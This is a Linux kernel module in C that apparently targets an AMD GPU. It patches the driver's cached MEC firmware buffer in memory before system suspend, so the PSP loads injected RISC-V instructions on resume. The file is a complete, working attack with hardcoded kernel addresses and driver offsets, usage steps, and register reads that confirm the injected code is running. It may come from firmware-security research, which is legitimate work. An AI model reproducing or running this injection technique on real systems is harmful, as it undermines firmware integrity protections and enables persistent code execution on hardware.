/*
 * suspend_inject.c — Patch fw_pri + system suspend/resume attack
 *
 * During S3 resume, PSP fully reinitializes and reloads ALL firmware
 * from driver's cached buffers (fw_pri). Patch fw_pri before suspend,
 * PSP loads our patched firmware on resume.
 *
 * Usage:
 *   1. insmod suspend_inject.ko
 *   2. sudo rtcwake -m mem -s 5    (auto-wakes after 5s)
 *   3. dmesg | grep 'si:'
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/notifier.h>
#include <linux/suspend.h>

MODULE_LICENSE("GPL");

/* KASLR — update after each reboot */
#define RREG_ADDR  0xFFFFFFFFC0E28460ULL
#define WREG_ADDR  0xFFFFFFFFC0E28820ULL

typedef u32 (*rreg_fn)(void*, u32);

static void *g_adev;
static void *g_fw_pri;
static rreg_fn g_rreg;
static u32 g_gc;

static int si_pm_notify(struct notifier_block *nb, unsigned long action, void *data)
{
    if (action == PM_SUSPEND_PREPARE && g_fw_pri) {
        u32 v;
        copy_from_kernel_nofault(&v, (u8*)g_fw_pri + 0x4000, 4);
        if (v != 0x00000013) {
            u32 nop = 0x00000013, jal = 0xFF5FF06F;
            copy_to_kernel_nofault((u8*)g_fw_pri + 0x4000, &nop, 4);
            copy_to_kernel_nofault((u8*)g_fw_pri + 0x4004, &nop, 4);
            copy_to_kernel_nofault((u8*)g_fw_pri + 0x4008, &nop, 4);
            copy_to_kernel_nofault((u8*)g_fw_pri + 0x400C, &jal, 4);
            pr_info("si: SUSPEND_PREPARE — re-patched fw_pri\n");
        } else {
            pr_info("si: SUSPEND_PREPARE — already patched\n");
        }
    }
    if (action == PM_POST_SUSPEND && g_rreg && g_adev) {
        u32 pc = g_rreg(g_adev, g_gc + 0x2908);
        u32 ic_lo = g_rreg(g_adev, g_gc + 0x2812);
        u32 ic_hi = g_rreg(g_adev, g_gc + 0x2813);
        u32 s0 = g_rreg(g_adev, g_gc + 0x3460);
        u32 v;
        pr_info("si: POST_SUSPEND — PC=0x%04X IC=0x%08X_%08X S0=0x%08X\n",
            pc, ic_hi, ic_lo, s0);
        if (pc >= 0x800 && pc <= 0x803)
            pr_info("si: *** MEC EXECUTING PATCHED CODE! PC=0x%04X ***\n", pc);
        else if (pc != 0)
            pr_info("si: MEC alive at PC=0x%04X\n", pc);
        copy_from_kernel_nofault(&v, (u8*)g_fw_pri + 0x4000, 4);
        pr_info("si: fw_pri[0x800]=0x%08X (%s)\n", v,
            v == 0x00000013 ? "PATCHED" : "OVERWRITTEN BY DRIVER");
    }
    return NOTIFY_OK;
}

static struct notifier_block si_pm_nb = {
    .notifier_call = si_pm_notify,
    .priority = INT_MAX,
};

static int __init si_init(void)
{
    struct pci_dev *p = pci_get_device(0x1002, 0x1586, NULL);
    void *psp;
    if (!p) return -ENODEV;
    g_adev = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)g_adev + 0x3B910;
    g_fw_pri = (void*)*(u64*)((u8*)psp + 0x058);
    g_rreg = (rreg_fn)RREG_ADDR;
    g_gc = 0x2800;

    pr_info("si: === SUSPEND/RESUME INJECTION ===\n");
    pr_info("si: fw_pri=%px\n", g_fw_pri);

    /* Verify + load firmware if needed */
    {
        u32 hdr;
        copy_from_kernel_nofault(&hdr, g_fw_pri, 4);
        if (hdr != 0x0006D3E0) {
            struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
            if (!IS_ERR(fp)) {
                loff_t pos = 0;
                ssize_t n = kernel_read(fp, g_fw_pri, 0x6E000, &pos);
                filp_close(fp, NULL);
                pr_info("si: Loaded %zd bytes\n", n);
            }
        }
    }

    /* Patch PC=0x800 */
    {
        u32 *c = (u32*)((u8*)g_fw_pri + 0x4000);
        pr_info("si: Orig [0x800]: %08X %08X %08X %08X\n", c[0],c[1],c[2],c[3]);
        c[0]=0x00000013; c[1]=0x00000013; c[2]=0x00000013; c[3]=0xFF5FF06F;
        pr_info("si: PATCHED\n");
    }

    /* Current state */
    {
        u32 pc = g_rreg(g_adev, g_gc + 0x2908);
        pr_info("si: Current PC=0x%04X\n", pc);
    }

    register_pm_notifier(&si_pm_nb);
    pr_info("si: Ready. Run: sudo rtcwake -m mem -s 5\n");
    pci_dev_put(p);
    return 0;
}

static void __exit si_exit(void)
{
    unregister_pm_notifier(&si_pm_nb);
    pr_info("si: unloaded\n");
}
module_init(si_init);
module_exit(si_exit);
